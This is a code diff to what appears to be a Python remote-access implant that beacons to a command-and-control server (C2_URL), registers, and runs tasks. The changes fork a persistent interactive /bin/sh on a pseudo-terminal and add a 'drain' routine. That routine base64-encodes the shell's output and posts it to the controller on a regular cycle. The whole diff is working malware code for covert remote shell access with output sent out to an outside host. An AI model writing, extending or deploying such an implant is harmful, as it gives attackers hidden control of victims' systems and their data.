@@ -104,31 +104,43 @@ def submit_result(agent_id, task_id, output, status="success"):
 
 persistent_shell = None
 persistent_master = None
+persistent_pid = None
 
 
 def get_persistent_shell():
-    global persistent_shell, persistent_master
+    global persistent_shell, persistent_master, persistent_pid
     if persistent_shell is None or persistent_shell.poll() is not None:
         master_fd, slave_fd = pty.openpty()
 
-        # Set window size for proper terminal behavior
         winsize = struct.pack("HHHH", 80, 24, 0, 0)
         fcntl.ioctl(master_fd, termios.TIOCSWINSZ, winsize)
 
-        persistent_shell = subprocess.Popen(
-            ["/bin/sh"],
-            stdin=slave_fd,
-            stdout=slave_fd,
-            stderr=slave_fd,
-            close_fds=True,
-        )
-        os.close(slave_fd)
-        persistent_master = master_fd
-
-        # Wait for shell prompt
-        time.sleep(0.3)
-        _flush_pty()
-    return persistent_shell, persistent_master
+        pid = os.fork()
+        if pid == 0:
+            for fd in (0, 1, 2):
+                try:
+                    os.close(fd)
+                except OSError:
+                    pass
+            try:
+                os.setsid()
+            except OSError:
+                pass
+            os.dup2(slave_fd, 0)
+            os.dup2(slave_fd, 1)
+            os.dup2(slave_fd, 2)
+            os.close(slave_fd)
+            os.close(master_fd)
+            os.execve("/bin/sh", ["/bin/sh", "-i"], os.environ)
+            os._exit(1)
+        else:
+            os.close(slave_fd)
+            persistent_master = master_fd
+            persistent_shell = pid
+            persistent_pid = pid
+            time.sleep(0.3)
+            _flush_pty()
+    return persistent_shell, persistent_master, persistent_pid
 
 
 def _flush_pty():
@@ -141,6 +153,24 @@ def _flush_pty():
             os.read(persistent_master, 65536)
     except (OSError, ValueError):
         pass
+
+
+def _read_pty(timeout=0.5):
+    global persistent_master
+    try:
+        out = b""
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            r, _, _ = select.select([persistent_master], [], [], 0.05)
+            if r:
+                chunk = os.read(persistent_master, 8192)
+                if not chunk:
+                    break
+                out += chunk
+                deadline = time.time() + 0.3
+        return out
+    except OSError:
+        return b""
 
 
 def execute_shell(command):
@@ -162,31 +192,17 @@ def execute_shell(command):
 
 def execute_shell_interactive(command):
     global persistent_master
-    proc, master = get_persistent_shell()
-
-    _flush_pty()
+    _, master, _ = get_persistent_shell()
     os.write(master, (command + "\n").encode())
+    out = _read_pty(2)
+    return out.decode(errors="replace")
 
-    output = b""
-    deadline = time.time() + 3
-    while time.time() < deadline:
-        r, _, _ = select.select([master], [], [], 0.1)
-        if r:
-            try:
-                chunk = os.read(master, 8192)
-            except OSError:
-                break
-            if not chunk:
-                break
-            output += chunk
-            deadline = time.time() + 0.5
 
-    result = output.decode(errors="replace")
-    # Strip the echoed command from output
-    lines = result.split("\n")
-    if len(lines) > 1 and lines[0].strip() == command.strip():
-        result = "\n".join(lines[1:])
-    return result
+def pty_drain():
+    global persistent_master
+    if persistent_master is None:
+        return b""
+    return _read_pty(0.3)
 
 
 def execute_upload(params):
@@ -394,9 +410,22 @@ def execute_task(task):
         submit_result(agent_id, task_id, output, "success")
 
 
+def submit_drain(data):
+    try:
+        b64 = __import__("base64").b64encode(data).decode()
+        requests.post(
+            f"{C2_URL}/result/{agent_id}",
+            json={"task_id": "drain", "output": "SHELL_DRAIN:" + b64, "status": "success"},
+            timeout=5,
+        )
+    except Exception:
+        pass
+
+
 if __name__ == "__main__":
     agent_id = get_agent_id()
     registered = False
+    drain_interval = 0
 
     while True:
         if not registered:
@@ -408,5 +437,13 @@ if __name__ == "__main__":
         tasks = beacon(agent_id)
         for task in tasks:
             execute_task(task)
+
+        if persistent_master is not None:
+            drain_interval += 1
+            if drain_interval >= 2:
+                out = pty_drain()
+                if out:
+                    submit_drain(out)
+                drain_interval = 0
 
         time.sleep(BEACON_INTERVAL)
